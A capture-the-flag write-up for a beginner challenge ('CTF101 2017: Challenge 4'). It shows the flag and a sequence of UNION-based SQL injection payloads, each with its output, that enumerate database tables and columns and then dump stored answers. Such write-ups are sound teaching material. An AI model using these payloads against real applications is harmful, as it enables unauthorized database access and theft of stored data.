# CTF101 2017: Challenge 4

## Type of attack

- `UNION`-based SQL Injection

## Flag

```
flag{h0w_d1d_y0u_g3t_th3_@n5w3r5s?}
```

---

## Get list of tables

```sql
' UNION SELECT 1, 2, 3, GROUP_CONCAT(table_name), 5 FROM information_schema.tables LIMIT 6 OFFSET 6;-- 
```

Returns:

```
CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,faq,questionBank
```

## Get list of columns

```sql
' UNION SELECT 1,2,3,GROUP_CONCAT(column_name), 4 FROM information_schema.columns WHERE table_name = 'faq' LIMIT 6 OFFSET 6;-- 
```

Returns:

```
id,type,frequency,question,answer
```

## Get list of columns: questionBank

```sql
' UNION SELECT 1,2,3,GROUP_CONCAT(column_name), 4 FROM information_schema.columns WHERE table_name = 'questionBank' LIMIT 6 OFFSET 6;-- 
```

Returns:

```
id,question,answer
```

## Get answers from questionBank

```sql
' UNION SELECT 1,2,3,answer,5 FROM questionBank LIMIT 6 OFFSET 6;-- 
```

Returns:

- I hope you did not dwell too much into this looool.
- Sorry if you flipped a table...
- Now, submit these answers and get your flag.
